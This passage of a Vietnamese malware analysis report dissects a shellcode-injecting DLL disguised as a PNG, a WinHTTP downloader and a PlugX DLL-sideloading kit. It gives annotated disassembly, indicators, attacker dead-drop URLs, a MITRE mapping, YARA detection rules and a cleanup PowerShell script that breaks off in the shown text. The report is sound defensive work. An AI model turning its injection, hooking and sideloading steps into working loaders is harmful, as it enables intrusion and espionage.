| **Kích thước sau giải mã** | **297,472 bytes** | **292,352 bytes** |
| **MD5** | `5f7f60e9fcc992794feb2d6e9908d1c3` | `3b36fb3a8cf15b0c5a288329e357e916` |
| **SHA256** | `18cc477fb8f4c147f3c31d0fdbb5ab8fdff12a75bb9b23e3c3927090537eff41` | `fd33b2952127554ffcf3940a35fa18a0cb035847eb685a5b6a94555cd825baeb` |
| **Kiến trúc PE** | `IMAGE_FILE_MACHINE_I386` (`0x14C`) | `IMAGE_FILE_MACHINE_AMD64` (`0x8664`) |
| **Các Section** | `.text`, `.rdata`, `.data`, `.gfids`, `.rsrc`, `.reloc` | `.text`, `.rdata`, `.data`, `.pdata`, `.gfids`, `.rsrc`, `.reloc` |
| **Bảng hàm Import chính** | `WriteProcessMemory`, `OpenProcess`, `Sleep`, `GetModuleHandleA` | `WriteProcessMemory`, `OpenProcess`, `Sleep`, `GetModuleHandleA` |

---

### 2.4. Cơ chế Anti-Sandbox & Process Injection trong Bộ nhớ

Khi DLL `main_background.png` được nạp vào không gian nhớ qua `LoadLibrary`, hàm `DllMain` tại `0x10001070` thực thi chuỗi hành vi nguy hại:

```asm
; --- 1. Anti-Sandbox Evasion ---
0x10001079: push 0x2710                     ; Tham số 10,000 miligiây (10 giây)
0x1000107e: call dword ptr [0x1000c00c]     ; Gọi KERNEL32!Sleep(10000)
0x1000109b: call 0x10001010                 ; Gọi hàm Inject Shellcode

; --- 2. Hàm Tiêm Bộ nhớ tại 0x10001010 ---
0x10001011: call dword ptr [0x1000c01c]     ; KERNEL32!GetCurrentProcessId()
0x10001017: push eax                        ; PID hiện tại
0x10001018: push 0                          ; bInheritHandle = FALSE
0x1000101a: push 0x1fffff                   ; dwDesiredAccess = PROCESS_ALL_ACCESS
0x1000101f: call dword ptr [0x1000c008]     ; KERNEL32!OpenProcess() -> Trả về hProcess (edi)
0x1000102b: push esi
0x1000102c: push 0x40                       ; flProtect = PAGE_EXECUTE_READWRITE
0x1000102e: push 0x3000                     ; flAllocationType = MEM_COMMIT | MEM_RESERVE
0x10001033: push 0x37088                    ; dwSize = 225,416 bytes
0x10001038: push 0                          ; lpAddress = NULL
0x1000103a: push edi                        ; hProcess
0x1000103b: call dword ptr [0x1000c018]     ; KERNEL32!VirtualAllocEx() -> Vùng nhớ RWX mới
0x10001041: push 0
0x10001043: push 0x37088                    ; Kích thước cần ghi: 225,416 bytes
0x10001048: push 0x10012760                 ; Địa chỉ nguồn: Khối dữ liệu tại section .data
0x1000104d: mov esi, eax                    ; Địa chỉ đích vùng RWX vừa cấp phát
0x1000104f: push esi
0x10001050: push edi                        ; hProcess
0x10001051: call dword ptr [0x1000c000]     ; KERNEL32!WriteProcessMemory()
0x1000105b: push 0
0x1000105d: push 0
0x1000105f: push 0
0x10001061: push esi                        ; lpStartAddress = Địa chỉ khối shellcode RWX
0x10001062: push 0
0x10001064: push 0
0x10001066: call dword ptr [0x1000c010]     ; KERNEL32!CreateThread() -> Thực thi Shellcode
```

#### Các Bước Thực thi:
1. **Sleep Delay (Anti-Sandbox):** Tạm dừng luồng thực thi trong đúng 10 giây (`0x2710` ms). Hầu hết các hệ thống phân tích hộp cát tự động có giới hạn phân tích tài liệu văn bản từ 30 – 60 giây; việc đưa lệnh `Sleep` vào trước khi thực thi payload giúp né tránh sự theo dõi hành vi ban đầu.
2. **Tự chiếm toàn quyền tiến trình:** Gọi `OpenProcess(0x1fffff, 0, GetCurrentProcessId())` để nhận handle có quyền `PROCESS_ALL_ACCESS`.
3. **Cấp phát bộ nhớ RWX:** Cấp phát một vùng nhớ lớn dung lượng **225,416 bytes** (`0x37088`) với cờ `PAGE_EXECUTE_READWRITE` (`0x40`).
4. **Sao chép Shellcode:** Sao chép khối dữ liệu độc hại từ section `.data` của DLL (bắt đầu tại VA `0x10012760`) vào vùng nhớ RWX.
5. **Kích hoạt luồng riêng biệt:** Tạo một thread mới bằng `CreateThread` trỏ thẳng vào đầu vùng nhớ RWX để thực thi độc lập với luồng chính của ứng dụng Word.

---

### 2.5. Phân tích Khối Shellcode & Sub-PE Giai đoạn 3 (WinHTTP Downloader)

Khối shellcode 225KB được bắt đầu bằng kỹ thuật mã không phụ thuộc vị trí nạp (Position Independent Code - PIC):

```asm
0x0000: call 5              ; Push địa chỉ EIP của lệnh tiếp theo vào stack
0x0005: pop ecx             ; ecx = 0x0005 (Lấy địa chỉ thực thi hiện tại trong bộ nhớ)
0x0006: sub ecx, 5          ; ecx = Địa chỉ gốc của Shellcode (Base Address)
0x0009: lea ecx, [ecx + 0xfc8]
0x000f: pushal 
0x0010: push ecx
0x0011: call 0x18
...
0x0021: mov eax, dword ptr fs:[0x18] ; Đọc Thread Environment Block (TEB)
0x002a: mov eax, dword ptr [eax + 0x30] ; Đọc Process Environment Block (PEB)
```

#### Phân tích Cơ chế Reflective Loader:
1. Shellcode duyệt qua danh sách module nạp trong PEB (`InMemoryOrderModuleList`) để tìm địa chỉ cơ sở của `kernel32.dll`.
2. Nó tự phân giải địa chỉ các API thiết yếu (`VirtualAlloc`, `VirtualProtect`, `LoadLibraryA`, `GetProcAddress`).
3. **Phát hiện Sub-PE nhúng:** Tại offset `0x1088` (hex của 4,232 bytes) bên trong khối shellcode là một **tệp tin PE 32-bit hoàn chỉnh thứ hai** (Magic byte `MZ`, Section `.text`, `.rdata`, `.data`, `.rsrc`, `.reloc`). Shellcode đóng vai trò một Reflective PE Loader để nạp Sub-PE này trực tiếp vào bộ nhớ mà không cần lưu xuống đĩa.

#### Phân tích Chức năng của Sub-PE (WinHTTP Downloader Stage 3):
Sub-PE được biên dịch bằng Microsoft Visual C++ và tích hợp thư viện giao tiếp mạng `WINHTTP.dll`:
* **Bảng hàm WinHTTP nạp động:** `WinHttpOpen`, `WinHttpConnect`, `WinHttpOpenRequest`, `WinHttpSendRequest`, `WinHttpReceiveResponse`, `WinHttpReadData`, `WinHttpQueryHeaders`, `WinHttpCloseHandle`.
* **Tham số dòng lệnh hỗ trợ:**
  ```text
  -u Url -t Time(Milisecond)
  ```
* **Dấu vết HTTP Header đặc trưng:**
  * **User-Agent:** `Mozilla/5.0 (Windows NT 10.0; Win32; x32; rv:60.0)`
  * **Accept Header:** `Accpet: */*` *(Chú ý: Chứa lỗi chính tả cố hữu của tác giả: chữ "Accpet" thay vì "Accept")*.
* **Hành vi mạng:** Kết nối định kỳ tới URL được cấu hình qua cả HTTP (cổng 80) và HTTPS (cổng 443), thực hiện tải về các payload giai đoạn tiếp theo (Stage 4 - RAT / Shellcode) và giải mã thực thi trực tiếp trong không gian tiến trình Word.

---

## Phần 3: Phân tích Chi tiết Mẫu 3 — c.rar (Bộ Kit DLL Sideloading Triad)

### 3.1. Mô hình Tấn công Kiềng Ba Chân (APT Sideloading Triad)

Bộ mẫu trong `c.rar` đại diện cho kỹ thuật tấn công kinh điển của họ mã độc gián điệp **PlugX / Korplug**, thường được các nhóm APT sử dụng rộng rãi nhằm vượt mặt các giải pháp Whitelisting và EDR hiện đại:

```
[c.rar] (Bộ 3 tệp)
   |
   +--> McAfee.exe (140,576 B)    : Tệp sạch hợp pháp, có chữ ký số của McAfee Inc.
   |
   +--> McUtil.dll (3,072 B)      : Thư viện DLL giả mạo đóng vai trò Sideload Loader
   |
   +--> McUtil.dll.mc (116,946 B) : Dữ liệu Shellcode Payload PlugX đã được mã hóa
```

```mermaid
sequenceDiagram
    autonumber
    participant Attacker as Kẻ tấn công
    participant Host as Nạn nhân / Hệ điều hành
    participant McAfee as McAfee.exe (Signed)
    participant MalDLL as McUtil.dll (Malicious)
    participant Payload as McUtil.dll.mc (PlugX)

    Attacker->>Host: Thả 3 tệp vào cùng thư mục
    Host->>McAfee: Kích hoạt McAfee.exe (Whitelisted Process)
    McAfee->>MalDLL: DLL Search Order: Tự động nạp McUtil.dll cùng thư mục
    Note over MalDLL: DllMain kiểm tra ngày >= 01/01/2014
    MalDLL->>McAfee: VirtualProtect & Ghi đè 5 byte Inline Hook tại offset 0x2f0c
    McAfee->>McAfee: Thực thi tiếp chạm vào 0x2f0c
    McAfee->>MalDLL: Nhảy sang hàm độc hại 0x10001000
    MalDLL->>Host: VirtualAlloc(1,048,699 B, RWX)
    MalDLL->>Payload: ReadFile nạp toàn bộ McUtil.dll.mc
    MalDLL->>Payload: call ecx (Thực thi PlugX Shellcode)
    MalDLL->>Host: Sleep(-1) (Ngủ vĩnh viễn giữ tiến trình McAfee)
```

---

### 3.2. Phân tích Tệp Thực thi Hợp pháp McAfee.exe (`mcoemcpy.exe`)

* **Tên tệp gốc trong PE Resource:** `mcoemcpy.exe`
* **Mô tả tệp (File Description):** McAfee OEM Info Copy Files (Phiên bản: `2.1.115.0`)
* **Bản quyền:** Copyright © 2006 McAfee, Inc.
* **Kích thước:** 140,576 bytes
* **Mã băm SHA256:** `3124fcb79da0bdf9d0d1995e37b06f7929d83c1c4b60e38c104743be71170efe`
* **MD5:** `884d46c01c762ad6ddd2759fd921bf71`
* **Chữ ký số (Authenticode):** Tệp tin sở hữu chứng chỉ số x.509 hợp lệ ký bởi **McAfee, Inc.** (Security Directory tại RVA `0x21000`, kích thước 5,408 bytes).

#### Nguyên lý Khai thác DLL Search Order Hijacking:
Tiến trình `mcoemcpy.exe` khi khởi động có nhu cầu nạp thư viện bổ trợ `McUtil.dll`. Theo thứ tự tìm kiếm DLL mặc định của Windows (`Search Order`):
1. **Thư mục chứa ứng dụng khởi chạy (Application Directory) $\rightarrow$ Ưu tiên số 1**
2. Thư mục hệ thống (`C:\Windows\System32`)
3. Thư mục Windows (`C:\Windows`)
4. Thư mục hiện hành (Current Directory)
5. Các đường dẫn trong biến môi trường `PATH`

Kẻ tấn công không sửa đổi bất kỳ byte nào của `McAfee.exe` (giữ nguyên tính toàn vẹn chữ ký số), mà chỉ cần đặt tệp `McUtil.dll` độc hại vào cùng thư mục. Khi `McAfee.exe` khởi chạy, hệ điều hành ưu tiên nạp ngay `McUtil.dll` giả mạo.

---

### 3.3. Thư viện Độc hại McUtil.dll & Kỹ thuật Inline API Hooking

* **Kích thước:** Cực kỳ nhỏ gọn: **3,072 bytes** (3 KB).
* **Mã băm SHA256:** `021e2269e61dec54aab5df2477a7fc24bc7449944c53634d611e826e343e32f4`
* **MD5:** `fe6f322a0c3e25947988d6fad92637b2`
* **Exports:** Không chứa bất kỳ hàm export nào (không cần cung cấp hàm chức năng, chỉ cần được nạp qua `DllMain`).
* **Imports tĩnh:** Chỉ import duy nhất 5 API từ `KERNEL32.dll`: `GetProcAddress`, `GetModuleFileNameW`, `GetSystemTime`, `VirtualProtect`, `GetModuleHandleA`. Tất cả các API nguy hiểm khác đều được giải mã chuỗi và nạp động qua `GetProcAddress`.

#### Bước 1: Kích hoạt Hẹn giờ (Time-bomb Delay Logic)
Tại hàm `0x10001100`, mã độc gọi `GetSystemTime` để lấy thời gian hệ thống và thực hiện phép toán kiểm tra:

```asm
0x10001108: call dword ptr [0x10002008]     ; KERNEL32!GetSystemTime(&SYSTEMTIME)
0x1000110e: movzx ecx, word ptr [esp + 4]   ; ecx = wYear
0x10001113: movzx edx, word ptr [esp + 6]   ; edx = wMonth
0x10001118: imul ecx, ecx, 0x64             ; ecx = Year * 100
0x1000111b: movzx eax, word ptr [esp + 0xa] ; eax = wDay
0x10001120: add ecx, edx                    ; ecx = Year * 100 + Month
0x10001122: imul ecx, ecx, 0x64             ; ecx = (Year * 100 + Month) * 100
0x10001125: add ecx, eax                    ; ecx = Year * 10000 + Month * 100 + Day
0x10001127: cmp ecx, 0x1335045              ; So sánh với giá trị 0x1335045
0x1000112d: jge 0x10001135                  ; Nếu >= 0x1335045 thì kích hoạt Hook
0x1000112f: xor eax, eax                    ; Ngược lại: trả về 0 và thoát
0x10001134: ret 
```

* **Giải mã giá trị `0x1335045`:** Đổi sang hệ thập phân: `0x1335045` = **`20140101`** (tương ứng ngày **01 tháng 01 năm 2014**).
* *Ý nghĩa chiến thuật:* Đây là kỹ thuật Time-bomb Evasion cổ điển của APT. Trước ngày 01/01/2014, mã độc hoàn toàn "ngủ đông" (trả về 0, không can thiệp bộ nhớ) để vượt qua các máy quét tự động của phòng lab diệt virus lúc mới phát tán.

#### Bước 2: Thiết lập Inline Hook trên McAfee.exe
Nếu ngày hệ thống thỏa mãn điều kiện, mã độc tiến hành can thiệp trực tiếp vào mã máy của tiến trình mẹ `McAfee.exe`:

```asm
0x10001136: push 0
0x10001138: call dword ptr [0x10002010]     ; GetModuleHandleA(NULL) -> Base của McAfee.exe
0x10001142: push ecx                        ; &oldProtect
0x10001143: push 0x40                       ; PAGE_EXECUTE_READWRITE
0x10001145: mov esi, eax                    ; esi = McAfeeBase (thường là 0x00400000)
0x10001147: push 0x10                       ; Kích thước 16 bytes
0x10001149: add esi, 0x2f0c                 ; Mục tiêu Hook = McAfeeBase + 0x2f0c
0x1000114f: push esi
0x10001150: call dword ptr [0x1000200c]     ; KERNEL32!VirtualProtect()
; Tính khoảng cách tương đối: Offset = 0x10001000 - (McAfeeBase + 0x2f0c) - 5
0x10001169: mov edx, 0x10001000
0x1000116e: sub edx, esi
0x10001170: sub edx, 5
0x10001173: mov dword ptr [0x10003000], edx
; Ghi đè 5 byte opcode: JMP rel32 (0xE9 xx xx xx xx)
0x10001179: mov byte ptr [esi], 0xe9        ; Opcode JMP
0x1000117e: mov al, byte ptr [0x10003000]
0x10001183: mov byte ptr [esi + 1], al      ; Byte 1 của relative offset
0x1000118e: shr edx, 8
0x10001191: mov byte ptr [esi + 2], dl      ; Byte 2
...
```

* **Vị trí bị can thiệp:** `McAfee.exe + 0x2f0c`.
* **Cơ chế:** Ngay sau khi `DllMain` trả về, luồng khởi động của `McAfee.exe` tiếp tục chạy bình thường cho đến khi chạm vào lệnh tại offset `0x2f0c`. Tại đây, lệnh `JMP` bị tiêm sẽ lập tức chuyển hướng con trỏ lệnh EIP sang hàm độc hại `0x10001000` của `McUtil.dll`.

---

### 3.4. Logic Kích hoạt Hẹn giờ (Time-bomb Delay) & Nạp Khối McUtil.dll.mc

Tại hàm xử lý Hook `0x10001000`:

```asm
; 1. Nạp VirtualAlloc động và cấp phát bộ nhớ
0x1000100f: push 0x10002018                 ; "kernel32.dll"
0x10001014: call edi                        ; GetModuleHandleA / LoadLibraryA
0x1000101c: push 0x10002028                 ; "VirtualAlloc"
0x10001021: push eax
0x10001022: call ebx                        ; GetProcAddress
0x10001024: push 0x40                       ; PAGE_EXECUTE_READWRITE
0x10001026: push 0x1000                     ; MEM_COMMIT
0x1000102b: push 0x10007b                   ; Kích thước = 1,048,699 bytes (~1MB)
0x10001030: push 0
0x10001032: call eax                        ; VirtualAlloc() -> Trả về buffer RWX (esi)

; 2. Lấy đường dẫn tệp McAfee.exe và đổi tên thành McUtil.dll.mc
0x10001034: push 0x101b
0x10001039: mov esi, eax
0x1000103b: push esi
0x1000103c: push 0
0x1000103e: call dword ptr [0x10002004]     ; GetModuleFileNameW(NULL, buffer, 0x101b)
; Duyệt ngược tìm ký tự '\' (0x5c)
0x10001061: cmp word ptr [esi + ecx*2], 0x5c
0x10001066: je 0x10001072
...
; Nối chuỗi "McUtil.dll.mc" vào sau dấu '\' bằng lstrcpyW
0x10001072: push 0x10002044                 ; L"McUtil.dll.mc"
0x10001077: lea ecx, [esi + ecx*2 + 2]
0x1000107b: push ecx
0x1000107c: call eax                        ; lstrcpyW()

; 3. Mở và nạp dữ liệu từ McUtil.dll.mc
0x10001085: push 0x10002060                 ; "CreateFileW"
...
0x10001091: push 3                          ; OPEN_EXISTING
0x10001095: push 1                          ; FILE_SHARE_READ
0x10001097: push 0x80000000                 ; GENERIC_READ
0x1000109c: push esi                        ; Đường dẫn tới McUtil.dll.mc
0x1000109d: call eax                        ; CreateFileW()
...
0x100010b1: push 0x1000206c                 ; "ReadFile"
0x100010c2: push 0x10007b                   ; Đọc toàn bộ dữ liệu vào buffer RWX
0x100010c9: call eax                        ; ReadFile()

; 4. Kích hoạt trực tiếp Shellcode Payload
0x100010cb: pushal 
0x100010cc: mov ecx, 0
0x100010d1: push ecx
0x100010d2: mov ecx, dword ptr [ebp - 0xc]  ; Địa chỉ buffer chứa McUtil.dll.mc
0x100010d5: call ecx                        ; CALL TRỰC TIẾP VÀO SHELLCODE!
0x100010d7: popal 

; 5. Duy trì tiến trình ngầm (Infinite Sleep)
0x100010e3: push 0x10002078                 ; "Sleep"
...
0x100010ef: push -1                         ; Tham số dwMilliseconds = 0xFFFFFFFF (Vô hạn)
0x100010f1: call eax                        ; Sleep(INFINITE)
```

#### Phân tích Các Bước:
1. Cấp phát **1,048,699 bytes** (`0x10007B`) bộ nhớ RWX bằng `VirtualAlloc`.
2. Định vị tệp payload `McUtil.dll.mc` trong cùng thư mục chạy bằng `GetModuleFileNameW` và `lstrcpyW`.
3. Đọc toàn bộ 116,946 bytes từ tệp `McUtil.dll.mc` vào vùng nhớ thực thi bằng `CreateFileW` và `ReadFile`.
4. Gọi trực tiếp `call ecx` vào buffer để trao quyền điều khiển cho khối shellcode PlugX.
5. Sau khi payload khởi tạo các luồng ngầm xong, luồng cha được đưa vào trạng thái **`Sleep(INFINITE)`**. Nhờ đó, tiến trình `McAfee.exe` không bao giờ kết thúc, duy trì vỏ bọc của một tiến trình bảo mật hợp pháp trong hệ thống.

---

### 3.5. Cấu trúc Khối Shellcode McUtil.dll.mc & Kỹ thuật Chống Dịch ngược (Anti-Disassembly)

* **Tên tệp:** `McUtil.dll.mc`
* **Kích thước:** 116,946 bytes
* **Mã băm SHA256:** `58648fed34d7617c3217af047f331cb8e16012b8ae7d4fdebf77e31f6fa79cb5`
* **MD5:** `402a04ce4f1ebda0e8e9447b1fb7a4ee`

Khối shellcode này áp dụng kỹ thuật **Opaque Predicates** và chèn mã rác (Junk Code Insertion) cực kỳ dày đặc để chống lại các công cụ dịch ngược tĩnh tuyến tính (Linear Sweep Disassemblers như IDA Pro, Ghidra, OllyDbg):

```asm
0x0000: inc edi
0x0001: jno 6               ; Nhảy nếu không tràn
0x0003: jo 6                ; Nhảy nếu tràn -> Luôn luôn nhảy tới offset 0x06!
0x0005: jne 0x7d            ; Byte rác gây lỗi phân tích
...
0x005b: jb 0x61             ; Nhảy nếu cờ Carry = 1
0x005e: jae 0x61            ; Nhảy nếu cờ Carry = 0 -> Luôn luôn nhảy tới 0x61!
0x0060: jbe 0x4b            ; Byte opcode 0xE8 (CALL giả) nằm tại đây để bẫy disassembler
...
0x0095: jbe 0x9a
0x0097: ja 0x9a             ; Luôn luôn nhảy tới 0x9a, bỏ qua byte rác tại 0x99
...
0x00fb: jb 0x100
0x00fd: jae 0x100           ; Luôn luôn nhảy tới 0x100
```

#### Nguyên lý Kỹ thuật:
Cặp lệnh nhảy điều kiện đối lập nhau (như `jb` và `jae`, hoặc `jo` và `jno`) có cùng đích nhảy thực chất tương đương với một lệnh `JMP` vô điều kiện. Tuy nhiên, kẻ tấn công cố ý đặt một byte `0xE8` (mã opcode của lệnh `CALL`) vào ngay giữa. Các công cụ dịch ngược tuyến tính sẽ hiểu lầm `0xE8` là bắt đầu của một lệnh gọi hàm 5-byte, dẫn đến việc giải mã toàn bộ chuỗi lệnh tiếp theo bị sai lệch độ lệch (Disassembly Desynchronization).

Sau khi vượt qua stub giải mã obfuscation, `McUtil.dll.mc` bung ra payload PlugX hoàn chỉnh với đầy đủ các tính năng:
* Đánh cắp thông tin bàn phím (Keylogger).
* Quản lý tệp tin, tiến trình và registry từ xa.
* Port forwarding và mở kênh điều khiển Shell ngầm qua cổng 443.

---

## 5. Bảng Chỉ số Thỏa hiệp Tổng hợp (Consolidated IOCs)

### 5.1. Bảng Mã băm Tệp tin (File Hashes)

| Mẫu / Thành phần | Kích thước | Mã MD5 | Mã SHA256 |
| :--- | :--- | :--- | :--- |
| **`a.exe`** (Mẫu 1) | 20,481 B | `bc45beb8b862d2136a070ae793685386` | `2fb960b07ee894043007a1f3be2ff985863c27be4bd9f50b3ddb735963e113b9` |
| **`malw.rtf`** (Mẫu 2) | 949,986 B | `0a5a0c889fd8772da489a327d4fdd8d6` | `61182036fd1e668ad818f64c351034344b54f92793b0dcc52045cb221f9bb2c2` |
| **`main_background.png` (x86)** | 297,472 B | `5f7f60e9fcc992794feb2d6e9908d1c3` | `18cc477fb8f4c147f3c31d0fdbb5ab8fdff12a75bb9b23e3c3927090537eff41` |
| **`main_background.png` (x64)** | 292,352 B | `3b36fb3a8cf15b0c5a288329e357e916` | `fd33b2952127554ffcf3940a35fa18a0cb035847eb685a5b6a94555cd825baeb` |
| **`McAfee.exe`** (Mẫu 3 - Signed) | 140,576 B | `884d46c01c762ad6ddd2759fd921bf71` | `3124fcb79da0bdf9d0d1995e37b06f7929d83c1c4b60e38c104743be71170efe` |
| **`McUtil.dll`** (Mẫu 3 - Loader) | 3,072 B | `fe6f322a0c3e25947988d6fad92637b2` | `021e2269e61dec54aab5df2477a7fc24bc7449944c53634d611e826e343e32f4` |
| **`McUtil.dll.mc`** (Mẫu 3 - Payload) | 116,946 B | `402a04ce4f1ebda0e8e9447b1fb7a4ee` | `58648fed34d7617c3217af047f331cb8e16012b8ae7d4fdebf77e31f6fa79cb5` |

### 5.2. Dấu vết Mạng (Network & C2 Indicators)

| Loại chỉ số | Giá trị | Ngữ cảnh sử dụng |
| :--- | :--- | :--- |
| **Dead-Drop URL 1** | `http://kumardeep.sosblogs.com/The-first-blog-b1/RSS-b1-rss2-posts.htm` | Mẫu 1 (Truy vấn C2 URL từ title RSS) |
| **Dead-Drop URL 2** | `http://blogs.rediff.com/anilchopra/feed/` | Mẫu 1 (Kênh RSS dự phòng) |
| **Dead-Drop URL 3** | `http://www.blogster.com/kapoorsunil09/profile/rss` | Mẫu 1 (Kênh RSS dự phòng) |
| **User-Agent 1** | `Mozilla/5.0 (Windows NT 10.0; Win32; x32; rv:60.0)` | Mẫu 2 (Sub-PE WinHTTP Downloader) |
| **User-Agent 2** | `Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.9.1) Gecko/20090624 Firefox/3.5` | Mẫu 1 (WMI Script XMLHttp) |
| **HTTP Header** | `Accpet: */*` (Typo cố ý của tác giả) | Mẫu 2 (WinHTTP Request Header) |

### 5.3. Dấu vết Hệ thống & Khóa Registry (Host Artifacts)

| Loại dấu vết | Chi tiết / Đường dẫn | Tác động |
| :--- | :--- | :--- |
| **WMI Consumer** | `root\subscription:ActiveScriptEventConsumer.Name="ProbeScriptFint"` | Bám trụ thực thi JavaScript ngầm |
| **WMI Timer** | `root\subscription:__IntervalTimerInstruction.Timerid="ProbeScriptFint"` | Kích hoạt chu kỳ mỗi 6,000 ms |
| **WMI Filter** | `root\subscription:__EventFilter.Name="ProbeScriptFint"` | Lọc sự kiện timer |
| **Registry Key** | `HKCU\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\InprocServer32` | COM Hijack trỏ vào `main_background.png` |
| **Tệp tin nguy hại** | `C:\Windows\system32\Instell.exe` | File nhị phân ngụy trang của Mẫu 1 |
| **Tệp nhật ký** | `C:\Windows\system32\httpcom.log` | Ghi log hoạt động của Mẫu 1 |
| **Tệp DLL giả ảnh** | `%APPDATA%\main_background.png` | DLL độc hại trích xuất từ Mẫu 2 |
| **Tệp nhị phân PlugX**| `McUtil.dll` và `McUtil.dll.mc` | DLL giả mạo và Shellcode của Mẫu 3 |

---

## 6. Ma trận Đối chiếu MITRE ATT&CK

| Giai đoạn Tấn công (Tactic) | Kỹ thuật (Technique ID & Name) | Mẫu 1 (a.exe) | Mẫu 2 (malw.rtf) | Mẫu 3 (Triad Kit) |
| :--- | :--- | :---: | :---: | :---: |
| **Initial Access (TA0001)** | Phishing: Spearphishing Attachment (`T1566.001`) | | 🟢 | |
| **Execution (TA0002)** | Command and Scripting Interpreter: WMI (`T1059.005`) | 🟢 | | |
| | Visual Basic for Applications Macro (`T1059.005`) | | 🟢 | |
| **Persistence (TA0003)** | Event Triggered: WMI Event Subscription (`T1546.003`) | 🟢 | | |
| | Hijack Execution Flow: COM Hijacking (`T1574.002`) | | 🟢 | |
| | Hijack Execution Flow: DLL Search Order Hijacking (`T1574.001`) | | | 🟢 |
| **Defense Evasion (TA0005)** | Masquerading: Typosquatting File Name (`T1036.005`) | 🟢 | 🟢 | |
| | Indicator Removal: Timestomp (`T1070.006`) | 🟢 | | |
| | Process Injection: Memory Allocation (`T1055`) | | 🟢 | 🟢 |
| | Obfuscated Files or Information (`T1027`) | 🟢 | 🟢 | 🟢 |
| | Subvert Trust Controls: Install Signed Binary (`T1553.002`) | | | 🟢 |
| | Time Based Evasion: Delayed Execution (`T1497.003`) | | 🟢 | 🟢 |
| **Discovery (TA0007)** | System Information Discovery (`T1082`) | 🟢 | | |
| | System Network Configuration Discovery (`T1016`) | 🟢 | | |
| **Command and Control (TA0011)** | Web Service: Dead-Drop Resolver (`T1102.001`) | 🟢 | | |
| | Application Layer Protocol: HTTP/HTTPS (`T1071.001`) | 🟢 | 🟢 | 🟢 |

---

## 7. Bộ Quy tắc Nhận diện (YARA Rules) & Kịch bản Ứng phó Sự cố (Incident Response)

### 7.1. Bộ Quy tắc YARA Chuẩn hóa

```yara
/*
 * Quy tắc nhận diện Mẫu 1: APT30 WMI ActiveScript Dropper
 */
rule APT30_WMI_ActiveScript_Dropper {
    meta:
        description = "Detects APT30 / Naikon WMI Event Consumer Dropper (a.exe)"
        author = "Antigravity Threat Intelligence"
        date = "2026-10-13"
        hash = "2fb960b07ee894043007a1f3be2ff985863c27be4bd9f50b3ddb735963e113b9"
    strings:
        $s1 = "Instell.exe" ascii nocase
        $s2 = "httpcom.log" ascii nocase
        $s3 = "ProbeScriptFint" ascii wide
        $s4 = "ActiveScriptEventConsumer" ascii wide
        $s5 = "JavaScript" wide
    condition:
        uint16(0) == 0x5A4D and (3 of ($s*))
}

/*
 * Quy tắc nhận diện Mẫu 2: MHTML COM Hijacking Word Dropper
 */
rule APT_MHTML_COM_Hijack_Dropper {
    meta:
        description = "Detects MHTML Document with COM Hijack VBA Macro (malw.rtf)"
        author = "Antigravity Threat Intelligence"
        date = "2026-10-13"
        hash = "61182036fd1e668ad818f64c351034344b54f92793b0dcc52045cb221f9bb2c2"
    strings:
        $clsid = "{2DEA658F-54C1-4227-AF9B-260AB5FC3543}" ascii wide nocase
        $target = "main_background.png" ascii wide nocase
        $mime = "multipart/related" ascii nocase
        $table = "TVqQAAMAAAAEAAAA" ascii wide
    condition:
        $mime at 0 and ($clsid or ($target and $table))
}

/*
 * Quy tắc nhận diện Mẫu 3: PlugX Sideload Loader McUtil.dll
 */
rule PlugX_McUtil_Sideload_Loader {
    meta:
        description = "Detects malicious McUtil.dll sideloading component for McAfee.exe"
        author = "Antigravity Threat Intelligence"
        date = "2026-10-13"
        hash = "021e2269e61dec54aab5df2477a7fc24bc7449944c53634d611e826e343e32f4"
    strings:
        $payload = "McUtil.dll.mc" wide
        $api1 = "VirtualAlloc" ascii
        $api2 = "CreateFileW" ascii
        $api3 = "ReadFile" ascii
        $api4 = "Sleep" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 10KB and $payload and (3 of ($api*))
}
```

---

### 7.2. Kịch bản Ứng phó Sự cố & Dọn dẹp (PowerShell Incident Response Script)

Quản trị viên an ninh hệ thống có thể chạy tập lệnh PowerShell sau với quyền **Administrator** để tự động kiểm tra, cách ly và dọn dẹp triệt để cả 3 mối đe dọa trên hệ thống:

```powershell
<#
.SYNOPSIS
    Tập lệnh phản ứng sự cố khẩn cấp (Incident Response) loại bỏ mã độc từ a.rar, b.rar, c.rar
.DESCRIPTION
    Quét và dọn sạch WMI Subscriptions, COM Hijacking Registry, và các tiến trình Sideloading.
#>

# Yêu cầu quyền Administrator
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Error "Vui long chay PowerShell voi quyen Run as Administrator!"
    Exit 1
}

Write-Host "=== BAT DAU RA SOAT VA XU LY SU CO MA DOC ===" -ForegroundColor Cyan

# -------------------------------------------------------------
# 1. XỬ LÝ MẪU 1: GỠ BỎ WMI EVENT CONSUMER & INSTEL.EXE
# -------------------------------------------------------------
Write-Host "[1/4] Kiem tra WMI Event Persistence (ProbeScriptFint)..." -ForegroundColor Yellow

$consumer = Get-CimInstance -Namespace root\subscription -ClassName ActiveScriptEventConsumer -Filter "Name='ProbeScriptFint'" -ErrorAction SilentlyContinue
if ($consumer) {
    Remove-CimInstance -InputObject $consumer
    Write-Host " [+] Da xoa WMI Consumer: ProbeScriptFint" -ForegroundColor Green
}

$filter = Get-CimInstance -Namespace root\subscription -ClassName __EventFilter -Filter "Name='ProbeScriptFint'" -ErrorAction SilentlyContinue
if ($filter) {
    Remove-CimInstance -InputObject $filter
    Write-Host " [+] Da xoa WMI Filter: ProbeScriptFint" -ForegroundColor Green
}

$timer = Get-CimInstance -Namespace root\subscription -ClassName __IntervalTimerInstruction -Filter "Timerid='ProbeScriptFint'" -ErrorAction SilentlyContinue
if ($timer) {
    Remove-CimInstance -InputObject $timer
    Write-Host " [+] Da xoa WMI Timer: ProbeScriptFint" -ForegroundColor Green
}

$binding = Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object { $_.Filter.Name -eq 'ProbeScriptFint' }
if ($binding) {
    Remove-CimInstance -InputObject $binding
    Write-Host " [+] Da xoa WMI Binding" -ForegroundColor Green
}

# Tiêu diệt tiến trình và xóa file Instell.exe
$instellPath = "C:\Windows\system32\Instell.exe"
if (Test-Path $instellPath) {
    Stop-Process -Name "Instell" -Force -ErrorAction SilentlyContinue
    Remove-Item $instellPath -Force
